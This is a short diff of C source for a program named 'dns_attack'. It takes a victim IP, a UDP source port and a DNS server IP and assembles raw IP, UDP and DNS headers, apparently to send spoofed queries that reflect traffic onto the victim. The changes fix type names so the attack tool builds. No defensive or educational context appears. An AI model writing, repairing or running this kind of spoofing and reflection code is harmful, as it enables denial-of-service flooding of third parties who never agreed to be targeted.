@@ -56,7 +56,7 @@ struct dns_hdr {
 $ ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>
 */
 
-void construct_dns_hdr(struct dns_hdr* h) {
+void construct_dns_hdr(dns_hdr* h) {
     h -> id = 0x7419;
     h -> flags = 0x0100;
 
@@ -87,8 +87,8 @@ int main(int argc, char const *argv[]) {
     memset(datagram, 0, 4096);
 
     struct iphdr  *ip_header  = (struct iphdr*  ) (datagram);
-    struct udphdr *udp_header = (struct udphdr* ) (datagram + sizeof(struct iphdr));
-    struct dnshdr *dns_header = (struct dns_hdr*) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
+    struct udphdr *udp_header = (struct udphdr* ) (datagram + sizeof(struct iphdr)); 
+	struct dns_hdr *dns_header = (struct dns_hdr*) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
     data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_hdr);
 
     construct_dns_hdr(dns_header);
